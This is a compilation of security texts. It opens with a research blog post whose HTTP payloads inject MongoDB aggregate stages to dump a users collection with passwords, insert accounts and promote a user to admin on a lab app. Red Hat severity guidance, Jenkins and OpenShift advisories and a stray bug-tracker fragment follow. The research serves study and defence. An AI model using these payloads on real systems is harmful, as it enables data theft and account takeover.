# [MongoDB NoSQL Injection with Aggregation Pipelines](https://soroush.me/blog/2024/06/mongodb-nosql-injection-with-aggregation-pipelines/)

![](https://i0.wp.com/soroush.me/blog/wp-content/uploads/2024/06/image-1.png?resize=625%2C233&ssl=1)
## Story

Last August (2023), while assisting with the NoSQL lab module for PortSwigger Web Academy, I discovered that, in rare cases, it is possible to access other collections when performing an injection attack in MongoDB. This wasn‚Äôt included in the training material due to its rarity and seemed more suited for a research topic. Although I‚Äôve been busy since then and haven‚Äôt had the chance to explore it further, I believe publishing my findings could still benefit some security researchers.

## Background

If you are not familiar with NoSQL injection attacks, I recommend studying it through PortSwigger‚Äôs Web Academy (<https://portswigger.net/web-security/nosql-injection>) to better understand the topic.

Here‚Äôs a brief introduction to the problem we‚Äôre tackling:

When a MongoDB NoSQL injection occurs, the data the user can access depends on where the vulnerability is and which collection is being used. For those familiar with traditional SQL databases, think of ‚Äú`collections`‚Äù in MongoDB as ‚Äú`tables`‚Äú, and ‚Äú`documents`‚Äù as ‚Äú`rows`‚Äú. If the injection happens in the ‚Äú`find`‚Äù method, data access is limited to the defined collection, which may not contain any sensitive data. This is why some clients might not consider a MongoDB NoSQL injection attack valuable.

This post explores a scenario where the ‚Äú`aggregate`‚Äù function in MongoDB is exposed and vulnerable to NoSQL injection attacks, increasing the impact by allowing:

* Reading data from other collections
* Adding data
* Updating data

## Details

A test case has been created to practice this in a VM, available at <https://github.com/irsdl/vulnerable-node-app/>. This is a modified version of a repository by [Charlie Belmer](https://twitter.com/CharlieBelmer) to try different cases of NoSQL injection attacks.

Imagine a NoSQL injection attack where users cannot control the collection name via input parameters but can control an aggregate. Here‚Äôs a vulnerable Node.js code example:

<https://github.com/irsdl/vulnerable-node-app/blob/master/app/routes/product.route.js#L206>

```
productRoutes.route('/lookup_agg').post(function(req, res) {
	let query = req.body;
  	if (typeof query !== 'undefined' && Object.keys(query).length > 0) {
		console.log("request " + JSON.stringify(query));
		console.log("MongoDB query: " + JSON.stringify(query));
		Product.aggregate(query)
		    .then(products => {
		        console.log("Data Retrieved: " + products);
		        res.json({products});
		    })
		    .catch(err => {
		        console.log(err);
		        res.json(err);
		    });
  	} else {
		res.json({});
	}
});

```

The following HTTP request and its JSON response show an example:

```
POST /product/lookup_agg HTTP/1.1
Host: vulnerable.lab:4000
Content-Type: application/json
Content-Length: 53

[
  {
    "$match": {"name": "Apple Juice"}
  }
]
```

Response body:

```
{"products":[{"_id":"66773d7c85bf15c9d920fe9d","name":"Apple Juice","category":"soft","released":true,"quantity":"30","__v":0}]}
```

In this case, the vulnerability occurs in the ‚Äúproducts‚Äù collection. Therefore, the following request to return all fields won‚Äôt result in much value:

```
POST /product/lookup_agg HTTP/1.1
Host: vulnerable.lab:4000
Content-Type: application/json
Content-Length: 32

[
  {
    "$match": {}
  }
]
```

Response body:

```
{"products":[{"_id":"66773d7c85bf15c9d920fe9d","name":"Apple Juice","category":"soft","released":true,"quantity":"30","__v":0},{"_id":"66773d7c85bf15c9d920fe9e","name":"Orange Juice","category":"soft","released":true,"quantity":"100","__v":0},{"_id":"66773d7c85bf15c9d920fe9f","name":"Coke","category":"fizzy","released":true,"quantity":"50","__v":0},{"_id":"66773d7c85bf15c9d920fea0","name":"Golden Bear","category":"alcohol","released":false,"quantity":"1","__v":0}]}
```

**How to Identify if it‚Äôs an Aggregate in Black-Box Testing?**

In MongoDB, the aggregate method always expects an array of aggregation stages as its first argument. Therefore, look for JSON arrays as a parameter. The ‚Äú`$match`‚Äù and ‚Äú`$lookup`‚Äù operators in a JSON request can also indicate the use of the aggregate method.

**Tricks for NoSQLi in Aggregates**

Here are some tricks you can perform when dealing with NoSQLi in an aggregate. ChatGPT was quite helpful in explaining these examples during my testing!

## **A) Reading Data from Other Collections**

**A.1) Using $lookup with a Dummy Field:**

It‚Äôs possible to use ‚Äú`$lookup`‚Äù to access other collections. The following HTTP request shows how the ‚Äúusers‚Äù collection could be accessed using this:

```
POST /product/lookup_agg HTTP/1.1
Host: vulnerable.lab:4000
Content-Type: application/json
Content-Length: 200

[
  {
    "$lookup": {
      "from": "users",
      "localField": "Dummy-IdontExist",
      "foreignField": "Dummy-IdontExist",
      "as": "user_docs"
    }
  },
  {
    "$limit": 1
  }
]
```

Here, ‚Äú`$lookup`‚Äù performs a left outer join to another collection, and ‚Äú`$limit`‚Äù restricts the number of documents. The limit was used to avoid repeating all users per product. We only want all users once!

Response body snippet was:

```
{"products":[{"_id":"66773d7c85bf15c9d920fe9d","name":"Apple Juice","category":"soft","released":true,"quantity":"30","__v":0,"user_docs":[{"_id":"66773d7c85bf15c9d920fe95","username":"guest","first_name":"","last_name":"","email":"[[email¬†protected]](/cdn-cgi/l/email-protection)","role":"guest","password":"password","locked":false,"resetPasswordToken":"","__v":0},‚Ä¶,{"_id":"66773d7c85bf15c9d920fe97","username":"carlos","first_name":"Scary","last_name":"Ghost","email":"[[email¬†protected]](/cdn-cgi/l/email-protection)","role":"user","password":"abc123","locked":true,"resetPasswordToken":"iioldsgiaioaiejiejirj0ifgsi","__v":0}]}]}
```

If dummy fields are not ideal, we can use the ‚Äú`__v`‚Äù field, which is automatically created by Mongoose, an Object Data Modelling (ODM) library for MongoDB and Node.js. This field is used to store the version of the document for internal purposes, particularly for handling document updates and preventing concurrent modifications.

**A.2) Using Union**

‚Äú`$unionWith`‚Äù combines the results of separate queries into one array, similar to ‚Äú`union all`‚Äù in a traditional SQL database. We can use it to get users‚Äô data like this:

```
POST /product/lookup_agg HTTP/1.1
Host: vulnerable.lab:4000
Content-Type: application/json
Content-Length: 229

[{
    "$match": {"foo":"bar"}
  },
  {
    "$unionWith": {
      "coll": "users",
      "pipeline": [
        {
          "$addFields": {
            "collection": "users"
          }
        }
      ]
    }
  }
]
```

‚Äú`$match`‚Äù was used with dummy data as we are not interested in seeing the products‚Äô fields!

If using dummy data is not ideal, the following can be used instead:

```
{
    "$match":{"_id":{"$exists":false}}
}
```
## B) **Adding/Inserting Data**

Injection via aggregates can also be used to create new documents or collections, or to rewrite existing ones. However, testers will still need to guess the data schema and some of their values before adding any data.

The following HTTP request shows an example of how a new user could be added to the database:

```
POST /product/lookup_agg HTTP/1.1
Host: vulnerable.lab:4000
Content-Type: application/json
Content-Length: 434

[
  {
    "$limit": 1
  },
  {
    "$replaceWith": {
      "username": "newUser",
      "first_name": "New",
      "last_name": "User",
      "email": "[[email¬†protected]](/cdn-cgi/l/email-protection)",
      "role": "user",
      "password": "password123",
      "locked": false,
      "resetPasswordToken": ""
    }
  },
  {
    "$merge": {
      "into": "users",
      "whenMatched": "merge",
      "whenNotMatched": "insert"
    }
  }
]
```

This can then be verified by getting a list of users from the users collection.

Note: Ensure that the limit is used as shown above to prevent adding multiple documents to the database!

## C) **Updating Data**

The aggregate method in MongoDB also allows changing data in different collections.

To modify data with ‚Äú`$replaceWith`‚Äú, the ‚Äú`_id`‚Äù field of the target document is needed. The following HTTP request shows how a user‚Äôs data could be modified in the designed lab:

```
POST /product/lookup_agg HTTP/1.1
Host: vulnerable.lab:4000
Content-Type: application/json
Content-Length: 379

[
  {
    "$limit": 1
  },
  {
    "$replaceWith": {
      "_id": { "$toObjectId": "66773d7c85bf15c9d920fe97" },
      "role":"admin",
      "password": "NewPassword123?",
      "locked": false,
      "resetPasswordToken": "1234567890"
    }
  },
  {
    "$merge": {
      "into": "users",
      "whenMatched": "merge",
      "whenNotMatched": "fail"
    }
  }
]
```

The ‚Äú`_id`‚Äù field could be obtained by sending the following JSON request:

```
[
   {
     "$unionWith": {
       "coll": "users"
     }
   },
   {
     "$match": { "username": "carlos" }
   },
   {
     "$project": {
       "_id": 1
     }
   }
]
```

However, if we do not have the ‚Äú`_id`‚Äù field, modification is still possible using the following HTTP request as an example:

```
POST /product/lookup_agg HTTP/1.1
Host: vulnerable.lab:4000
Content-Type: application/json
Content-Length: 421

[
  {
    "$unionWith": {
      "coll": "users"
    }
  },
  {
    "$match": { "username": "carlos" }
  },
  {
    "$set": {
      "role": "admin",
      "password": "NewPassword123! ",
      "locked": false,
      "resetPasswordToken": "1234567890"
    }
  },
  {
    "$merge": {
      "into": "users",
      "on": "_id",
      "whenMatched": "merge",
      "whenNotMatched": "fail"
    }
  }
]
```

This approach uses ‚Äú`$unionWith"` to include documents from the ‚Äúusers‚Äù collection, matches the specific user document by username, updates the fields, and finally merges the updated document back into the users collection. It‚Äôs crucial to mention that if multiple fields are matched, they will all be updated, which might corrupt the data. Therefore, avoid using Regular Expressions or a matching rule that might select more than one document in a collection.

## Some Thoughts for Further Research

I have not found a method to delete a document from a collection using aggregate. It would be interesting if someone could figure out how to delete Carlos!

In the MongoDB Aggregation Framework, the ‚Äú`$function`‚Äù and ‚Äú`$accumulator`‚Äù operators can run JavaScript, which may be useful in certain cases.

There are many other MongoDB [methods](https://www.mongodb.com/docs/manual/reference/method/) that could be exposed by mistake and then exploited by NoSQL injection attacks. For instance, I haven‚Äôt seen much research on methods such as ‚Äú`updateMany`‚Äù or ‚Äú`updateOne`‚Äù (NoSQLi when updating documents). It would be interesting to see what happens when these methods are exposed and how they can be abused to increase the impact.

# Severity ratings

## Understanding Red Hat security ratings

Red Hat Product Security rates the severity of security issues found
in Red Hat products using a four-point scale (Low, Moderate,
Important, and Critical), as well as including a separate Common
Vulnerability Scoring System (CVSS) base score. These scoring systems
provide a prioritized risk assessment to help you understand and
schedule upgrades to your systems, enabling informed decisions on the
risk each issue places on your unique environment.

The four-point scale tells you how serious Red Hat considers an issue
to be, helping you judge the severity and determine the most important
updates. The scale takes into account the potential risk based on a technical analysis of the exact flaw and its type. The risk level of a flaw does not change if an exploit or worm is later released for a flaw, or if one is available before the release of a fix. A flaw will only be re-evaluated if new technical details emerge.

The following table provides severity ratings for Red Hat products and systems. For flaws specific to AI models, see [Red Hat security ratings for AI models](https://access.redhat.com/security/ai).

| **Severity ratings** | **Security flaw description** |
| --- | --- |
| **Critical impact** | This rating is given to flaws that could be easily exploited by a remote unauthenticated attacker and lead to system compromise (arbitrary code execution) without requiring user interaction, or easily cause system compromise via inference end points on AI systems. Flaws that require authentication, local or physical access to a system, or an unlikely configuration are not classified as Critical impact. These are the types of vulnerabilities that can be exploited by worms. |
| **Important impact** | This rating is given to flaws that can easily compromise the confidentiality, integrity or availability of resources. These are the types of vulnerabilities that allow local or authenticated users to gain additional privileges, allow unauthenticated remote users to view resources that should otherwise be protected by authentication or other controls, allow authenticated remote users to execute arbitrary code, allow remote users to cause a denial of service, or can cause system compromise via inference end points on AI systems. |
| **Moderate impact** | This rating is given to flaws that may be more difficult to exploit but could still lead to some compromise of the confidentiality, integrity or availability of resources under certain circumstances. It is also given to flaws that could be exploited to cause denial of service-like conditions on AI systems via an inference end point, or allow attackers to steal other users‚Äô data from the AI system without authorization. These are the types of vulnerabilities that could have had a Critical or Important impact but are less easily exploited based on a technical evaluation of the flaw and/or affect unlikely configurations. || **Low impact** | This rating is given to all other issues that may have a security impact. These are the types of vulnerabilities that are believed to require unlikely circumstances to be able to be exploited, or where a successful exploit would give minimal consequences. This includes flaws that are present in a program‚Äôs source code but to which no current or theoretically possible, but unproven, exploitation vectors exist or were found during the technical analysis of the flaw. |

A Red Hat security advisory can contain fixes for more than one
vulnerability and for packages for more than one product (such as both
Red Hat Enterprise Linux 7 and 8). Each issue in an advisory has a
severity rating for each product. The overall severity of an advisory
is the highest severity out of all the individual issues, across all
the products the advisory targets. For simplicity, advisories only
show the overall severity. The advisories contain links to the
relevant entries in Red Hat's bug-tracking system, where you can
examine individual severity ratings and additional commentary, as well
as links to the relevant pages in Red Hat‚Äôs CVE database.

When a technology‚Äîenabled and most likely used by default‚Äîcompletely
blocks the exploitation of a particular vulnerability across all
architectures, we will adjust the severity level. When a technology
reduces the risk of a vulnerability, we may adjust the severity level
and give an explanation of the decision in the bug-tracking¬† and CVE
database entries.

## Common Vulnerability Scoring System (CVSS)

Common Vulnerability Scoring System (CVSS) base scores provide
additional guidance about a vulnerability, giving a detailed severity
rating by scoring the constant aspects of a vulnerability: Attack
Vector, Attack Complexity, User Interaction, Privileges Required,
Scope, Confidentiality, Integrity, and Availability.

CVSS version 2 base metrics are available for all vulnerabilities from
2009-2016, as well as selected earlier vulnerabilities. In 2016, Red
Hat adopted the CVSS v3 standard, and all vulnerabilities going
forward will use version 3.1 for scoring. These scores are found on
the
[CVE pages](https://access.redhat.com/security/security-updates/#/cve)
(linked from the References section of each Red Hat Security Advisory).

Red Hat does not solely use the CVSS rating to determine the priority
with which flaws are fixed, or to determine the severity rating of the
vulnerability. It is used as a guideline to identify and describe key
metrics of a flaw, however the priority for which flaws are fixed is
determined by the overall severity of the flaw using the
aforementioned four-point scale.¬† CVSS is meant to help customers
prioritize the order in which they remediate flaws.

### CVSS v3 Base Metrics

The CVSS v3 base metrics group covers the constant aspects of a
vulnerability:

* Attack Vector (AV) - Expresses the "remoteness" of the attack and
  how the vulnerability is exploited.
* Attack Complexity (AC) - Speaks to the difficulty of executing an
  attack and what factors are needed for it to be successful. (Along
  with User Interaction, Attack Complexity was formerly part of the
  Access Complexity metric.).
* User Interaction (UI) - Determines whether the attack requires an
  active human to participate or if the attack can be automated.
* Privileges Required (PR) - Documents the level of user
  authentication required for the attack to be successful. (This
  replaces the former Authentication metric.).
* Scope (S) - Determines whether an attacker can impact a component
  beyond its security scope/authority.
* Confidentiality (C) - Determines whether unauthorized parties can
  access data and to what extent.
* Integrity (I) - Measures the impact to the trustworthiness and
  veracity of data.
* Availability (A) - Refers to the impact to accessibility of data or
  services for authorized users.

A formula translates these measurements into a single, numerical base
score, ranging from 0.0 (no risk) to 10.0 (highest risk). Refer to
[Common Vulnerability Scoring System v3.1: User Guide](https://www.first.org/cvss/user-guide)
for detailed descriptions of the base metrics. It is important to note
that the CVSS base metrics were designed to be used with the other
CVSS metric groups, notably the Temporal and Environmental metrics, to
provide an accurate representation of risk in customer environments.
Alone, the Base metrics offer a shallow view of the vulnerability
itself without accounting for deployment or the environment.

### How Red Hat Uses CVSS v3 Base Metrics

We aim to comply with the CVSS v3 standard when assigning base scores,
and Red Hat uses base metrics that reflect how a vulnerability affects
our products specifically.¬† In addition, we do not use the Qualitative
Severity Rating Scale in the CVSS v3.1 User Guide to rate severity,
and our severity ratings are always based on the aforementioned
four-point scale.¬† In some circumstances, it may not be obvious why a
flaw received a particular score. The following are some common
vulnerability types with our interpretation and typical scoring:

#### Libraries

It is not always possible to know how third-party applications use
libraries, making it difficult to give accurate CVSS v3 base metrics
for flaws in system libraries. When rating these flaws, we take into
account the way the library is used by applications that we ship, and
also look at other popular software that may use the library in a way
that would cause an issue to be of higher severity, and adjust the
score appropriately.

#### Other Common Scores

Flaws where a local, unprivileged user can cause a kernel to crash
(denial of service) typically score 5.5 (for example,
[CVE-2019-9213](https://access.redhat.com/security/cve/CVE-2019-9213)).

Flaws that allow a local, unprivileged user to escalate their
privileges to root typically score 7.8 (for example,
[CVE-2019-18634](https://access.redhat.com/security/cve/CVE-2019-18634)).

Cross-site scripting flaws are generally scored as having Low impact
to Integrity and/or Confidentiality, with no impact to Availability,
in line with scoring from other vendors and NVD. A typical score for
these flaws is 6.1 (for example,
[CVE-2020-11023](https://access.redhat.com/security/cve/CVE-2020-11023)).

### Base Score Variations Across Products

It is common for a given CVE-named vulnerability to have several
different CVSS base metrics, depending on the product, version, and
architecture. Examples of this include:

* A vulnerability that only affected some architectures. For example,
  [CVE-2019-15031](https://access.redhat.com/security/cve/CVE-2019-15031)
  only affected PowerPC.
* A vulnerability that is mitigated by source code protection
  mechanisms on some platforms. For example,
  [CVE-2018-1125](https://access.redhat.com/security/cve/CVE-2018-1125)
  could have led to arbitrary code execution on Red Hat Enterprise
  Linux, but it is only a denial of service because it was compiled
  with FORTIFY protections.
* A vulnerability that affected more than one product.¬† For example,
  [CVE-2020-14060](https://access.redhat.com/security/cve/CVE-2020-14060)
  affected a component in both OpenShift and OpenStack.¬† The severity
  to OpenStack was lower (Low) as compared to OpenShift (Moderate)
  based on its usage; the overall vulnerability itself was rated
  Important.

If CVSS v3 base scores are significantly different across products, we
note that separately wherever possible. If we do not split the score,
we report the metric that gives the highest CVSS v3 base score (the
worst-case outcome).

### Differences Between NVD and Red Hat Scores

For open source software shipped by multiple vendors, the CVSS base
scores may vary for each vendor's version, depending on the version
they ship, how they ship it, the platform, and even how the software
is compiled. This makes scoring vulnerabilities difficult for
third-party vulnerability databases, such as NVD, who can give only a
single CVSS base score to each vulnerability, or when comparing to
other vendors who score based on the characteristics of use in their
own products. See the
[National Vulnerability Database](https://nvd.nist.gov/vuln-metrics/cvss)
for more information regarding NVD security ratings.

These differences can cause the scores to vary widely. Other reasons
may include how the source code was compiled with certain compiler
flags or hardening technologies that reduce or eliminate the security
severity of a flaw, or how the software is used within the product.
Software running standalone may suffer from a flaw, but its use within
a product may preclude the vulnerable code from ever being used in a
way that could be exploited.

For example, NVD may rate a flaw in a particular service as having
High Impact on the CVSS CIA Triad (Confidentiality, Integrity,
Availability) where the service in question is typically run as the
root user with full privileges on a system. However, in a Red Hat
product, the service may be specifically configured to run as a
dedicated non-privileged user running entirely in a SELinux sandbox,
greatly reducing the immediate impact from compromise, resulting in
Low impact.

For these reasons, we recommend that, whenever possible, you use a
CVSS base score provided by Red Hat in preference to a score from a
third party. Please
[let us know](https://access.redhat.com/site/security/team/contact/)
if you believe we have given an incorrect CVSS v3 base score for a
particular vulnerability. We are happy to discuss and update if
needed.

# Jenkins Security Advisory 2013-01-04

This advisory announces a security vulnerability that was found in Jenkins core.

## Description

This vulnerability allows attacker with an HTTP access to the server to retrieve the master cryptographic key of Jenkins. This key is used to encrypt sensitive data in configuration files under `$JENKINS_HOME` and in the HTML forms, authenticate agents connecting to the Jenkins controller, as well as the authenticate REST API access from users.

An attacker can then use this master cryptographic key to mount remote code execution attack against the Jenkins controller, or impersonate arbitrary users in making REST API calls.

There are several factors that mitigate some of these problems that may apply to specific installations.

* The particular attack vector is only applicable on Jenkins instances that have agents attached to them, and allow anonymous read access.
* Jenkins allows users to re-generate the API tokens. Those re-generated API tokens cannot be impersonated by the attacker.

## Severity

This vulnerability is rated as **critical**, as it can be mounted by an anonymous user, and a compromised system allows remote code execution.

## Fix

* Main line users should upgrade to Jenkins 1.498
* LTS users should upgrade to 1.480.2

All the prior versions are affected by these vulnerabilities.

These new versions generate a new set of different cryptographic keys to protect sensitive data, authenticate agents, and so on. Because of this, administrators of Jenkins need to be aware of the following implications of the upgrade:

* API tokens of many users will likely change as a result, and therefore if you have scripts and external programs that rely on these tokens, some of them will fail. Please retrieve the updated API tokens from the UI.
* Agents that are started via Java Web Start will fail to reconnect if the \*.jnlp file is locally stored. This is because the authentication tokens change. An administrator would have to login to the UI, retrieve the \*.jnlp file and overwrite what‚Äôs already on the agent. An agent that was launched via Java Web Start and then turned into a service through its menu falls into this category.
* Once the new version is started, the administrator needs to run the <re-keying> process to update the on-disk configuration files to use the newer encryption key. Go to "Manage Jenkins" page and follow the instruction at the top of the page. Also make sure to read [the Wiki page](re-keying) to understand more about this process.

| [Description](show_bug.cgi?id=892781#c0)  Miciah Dashiel Butler Masters    2013-01-07 20:20:44 UTC  ``` I have been unable to reproduce this bug following the steps in [bug 876942 comment 13](show_bug.cgi?id=876942#c13 "CLOSED CURRENTRELEASE - Race condition adding multiple SSH keys to gears") or the steps in [bug 878171 comment 0](show_bug.cgi?id=878171#c0 "CLOSED DUPLICATE - git clone fails for app on an account with multiple ssh keys - write_ssh_keys method in Node unix_user.rb is not thread safe").  However, we received a report of a very similar issue from a customer, and so I am cloning the bug report and backporting the workaround: <https://github.com/openshift/enterprise-server/pull/17>  +++ This bug was initially created as a clone of [Bug #876942](show_bug.cgi?id=876942 "CLOSED CURRENTRELEASE - Race condition adding multiple SSH keys to gears") +++  Description of problem: Create scalable app on devenv-stage_249, upgrade instance to devenv_2475.

Thanks!  --- Additional comment from Meng Bo on 2012-11-16 02:36:28 EST ---  Check this issue again after upgrade to devenv_2485.  For more dig, I found the real issue is: New added gears for scalable app missing one of the two ssh key (default & haproxy).  Not only for the new added db gears, but also for the scaled-up gears.  For the ones which missing default ssh key, it will not effect the git push, but user cannot ssh connect to the gear from client side. For the other ones which missing haproxy ssh key, it will fail during git push, and cannot be accessed from haproxy gear, but can be accessed from client side.  For the scalable app ruby18s There are 3 dbs and 2 web gears      mysql-5.1      = mysql://b662d2d079-bmeng1dev.dev.rhcloud.com:35631/     mongodb-2.2    = mongodb://641bae88f5-bmeng1dev.dev.rhcloud.com:35706/     postgresql-8.4 = postgresql://19d4d70da8-bmeng1dev.dev.rhcloud.com:35711/  a2ff18f412e94c01a232781025352a42.107.14:ruby-1.8;a2ff18f412-bmeng1dev.dev.rhcloud.com ae5c1ed4a5684cb084b525db862ead2d.107.14:ruby-1.8;ae5c1ed4a5-bmeng1dev.dev.rhcloud.com  The mysql and the first gear was existed before upgrade and the other three were added after upgrade.

Adding Kohsuke Kawaguchi to the CC since he seems to be a Jenkins
security related person. Also if you need CVE's for Jenkins (or any
other major Open Source project your participate in, this goes for
everyone) in future contact me and they can be assigned prior to
advisory release which makes life easier for everyone.

Yup they appear to be new (the last batch I did is acknowledged in the
earlier security advisory from Jenkins).

From:
[https://wiki.jenkins-ci.org/display/SECURITY/Jenkins+Security+Advisory+2012-11-20](https://wiki.jenkins-ci.org/display/SECURITY/Jenkins%2BSecurity%2BAdvisory%2B2012-11-20)

The first vulnerability is commonly known as HTTP response splitting
vulnerability, which can act as a cross-site scripting vulnerability.
This allows an anonymous attacker to inject malicious HTMLs to pages
served by Jenkins. This in turn allows an attacker to escalate his
privileges by hijacking sessions of other users. To mount this attack,
the attacker needs to know the exact URL of your Jenkins installation.
This vulnerability affects those who run Jenkins on its built-in
servlet container (this includes all the native packages.)

Please use CVE-2012-6072 for this issue.

The second vulnerability is so-called open redirect vulnerability.
This allows an anonymous attacker to create an URL that looks as if
it's pointing to Jenkins, yet it actually lands on the site that the
attacker controls. This can be therefore used as a basis for phishing.

Please use CVE-2012-6073 for this issue.

The third vulnerability is a cross-site scripting vulnerability that
allows an attacker with some degree of write access in Jenkins to
embed malicious JavaScript into pages generated by Jenkins.

Please use CVE-2012-6074 for this issue.

## Synopsis

Important: Red Hat OpenShift Enterprise 1.1 update

## Type/Severity

Security Advisory: Important

## Red Hat Insights patch analysis

Identify and remediate systems affected by this advisory.

[View affected systems](https://console.redhat.com/insights/patch/advisories/RHSA-2013%3A0220)

## Topic

Red Hat OpenShift Enterprise 1.1 is now available.

The Red Hat Security Response Team has rated this update as having
important security impact. Common Vulnerability Scoring System (CVSS) base
scores, which give detailed severity ratings, are available for each
vulnerability from the CVE links in the References section.

## Description

Red Hat OpenShift Enterprise is a cloud computing Platform-as-a-Service
(PaaS) solution designed for on-premise or private cloud deployments.

Refer to the Red Hat OpenShift Enterprise 1.1 Release Notes for information
about the changes in this release. The Release Notes will be available
shortly from <https://access.redhat.com/knowledge/docs/>

This update also fixes the following security issues:

It was found that the master cryptographic key of Jenkins could be
retrieved via the HTTP server that is hosting Jenkins. A remote attacker
could use this flaw to access the server and execute arbitrary code with
the privileges of the user running Jenkins. Note that this issue only
affected Jenkins instances that had slaves attached and that also allowed
anonymous read access (not the default configuration). Manual action is
also required to correct this issue. Refer to "Jenkins Security Advisory
2013-01-04", linked to in the References, for further information.
(CVE-2013-0158)

When the rhc-chk script was run in debug mode, its output included
sensitive information, such as database passwords, in plain text. As this
script is commonly used when troubleshooting, this flaw could lead to users
unintentionally exposing sensitive information in support channels (for
example, a Bugzilla report). This update removes the rhc-chk script.
(CVE-2012-5658)

Multiple flaws in the Jenkins web interface could allow a remote attacker
to perform HTTP response splitting and cross-site scripting (XSS) attacks,
as well as redirecting a victim to an arbitrary page by utilizing an open
redirect flaw. (CVE-2012-6072, CVE-2012-6074, CVE-2012-6073)

A flaw was found in the way rubygem-activerecord dynamic finders extracted
options from method parameters. A remote attacker could possibly use this
flaw to perform SQL injection attacks against applications using the Active
Record dynamic finder methods. (CVE-2012-6496)

The openshift-port-proxy-cfg program created a temporary file in an
insecure way. A local attacker could use this flaw to perform a symbolic
link attack, overwriting an arbitrary file accessible to the root user with
a "0" or a "1", which could lead to a denial of service. By default,
OpenShift uses polyinstantiation (per user) for the /tmp/ directory,
minimizing the risk of exploitation by local attackers. (CVE-2013-0164)

The CVE-2013-0164 issue was discovered by Michael Scherer of the Red Hat
Regional IT team.

Users of Red Hat OpenShift Enterprise 1.0 are advised to upgrade to Red Hat
OpenShift Enterprise 1.1.

## Solution

Before applying this update, make sure all previously-released errata
relevant to your system have been applied.

This update is available via the Red Hat Network. Details on how to
use the Red Hat Network to apply this update are available at
<https://access.redhat.com/knowledge/articles/11258>

# CloudBees Security Advisory 2012-11-19

This advisory announces two security vulnerabilities that were found in Jenkins core.

The first vulnerability is commonly known as [HTTP response splitting](http://en.wikipedia.org/wiki/HTTP_response_splitting) vulnerability, which can act as a cross-site scripting vulnerability. This allows an anonymous attacker to inject malicious HTMLs to pages served by Jenkins. This in turn allows an attacker to escalate his privileges by hijacking sessions of other users. To mount this attack, the attacker needs to know the exact URL of your Jenkins installation. This vulnerability affects those who run Jenkins on its built-in servlet container (this includes all the native packages.)

The second vulnerability is so-called [open redirect](http://cwe.mitre.org/data/definitions/601.html) vulnerability. This allows an anonymous attacker to create an URL that looks as if it's pointing to Jenkins, yet it actually lands on the site that the attacker controls. This can be therefore used as a basis for phishing.

The third vulnerability is a cross-site scripting vulnerability that allows an attacker with some degree of write access in Jenkins to embed malicious JavaScript into pages generated by Jenkins.

These vulnerabilities are discovered by [Soroush Dalili](http://soroush.secproject.com/) , and we'd like to thank him.

### Severity

CloudBees rates these vulnerabilities as **high** , when combined, as they allow malicious users to gain unauthorized access to the information and impersonate the administrator of the system. On the other hands, this attack can be only mounted passively, and the attacker needs to know the URL of your Jenkins installations.

### Fix

* Main line users should upgrade to Jenkins 1.491
* LTS users should upgrade to 1.480.1
* Users of Jenkins Enterprise by CloudBees 1.424.x should upgrade to [1.424.6.13](http://nectar-downloads.cloudbees.com/jenkins-enterprise/1.424/)
* Users of Jenkins Enterprise by CloudBees 1.447.x should upgrade to [1.447.4.1](http://nectar-downloads.cloudbees.com/jenkins-enterprise/1.447/)
* Users of Jenkins Enterprise by CloudBees 1.466.x should upgrade to [1.466.10.1](http://nectar-downloads.cloudbees.com/jenkins-enterprise/1.466/)
* The fix has already been rolled out to DEV@cloud.

All the prior versions are affected by these vulnerabilities.

# Jenkins Security Advisory 2012-11-20

This advisory announces two security vulnerabilities that were found in Jenkins core.

## Description

* The first vulnerability is commonly known as [HTTP response splitting](https://en.wikipedia.org/wiki/HTTP_response_splitting) vulnerability, which can act as a cross-site scripting vulnerability. This allows an anonymous attacker to inject malicious HTMLs to pages served by Jenkins. This in turn allows an attacker to escalate his privileges by hijacking sessions of other users. To mount this attack, the attacker needs to know the exact URL of your Jenkins installation. This vulnerability affects those who run Jenkins on its built-in servlet container (this includes all the native packages.) (CVE-2012-6072)
* The second vulnerability is so-called [open redirect](https://cwe.mitre.org/data/definitions/601.html) vulnerability. This allows an anonymous attacker to create an URL that looks as if it‚Äôs pointing to Jenkins, yet it actually lands on the site that the attacker controls. This can be therefore used as a basis for phishing. (CVE-2012-6073)
* The third vulnerability is a cross-site scripting vulnerability that allows an attacker with some degree of write access in Jenkins to embed malicious JavaScript into pages generated by Jenkins. (CVE-2012-6074)

These vulnerabilities are discovered by [Soroush Dalili](https://soroush.secproject.com/), and we‚Äôd like to thank him.

## Severity

These combined vulnerabilities are rated as **high**, as they allow malicious users to gain unauthorized access to the information and impersonate the administrator of the system. On the other hands, this attack can be only mounted passively, and the attacker needs to know the URL of your Jenkins installations.

## Fix

* Main line users should upgrade to Jenkins 1.491
* LTS users should upgrade to 1.480.1

All the prior versions are affected by these vulnerabilities.
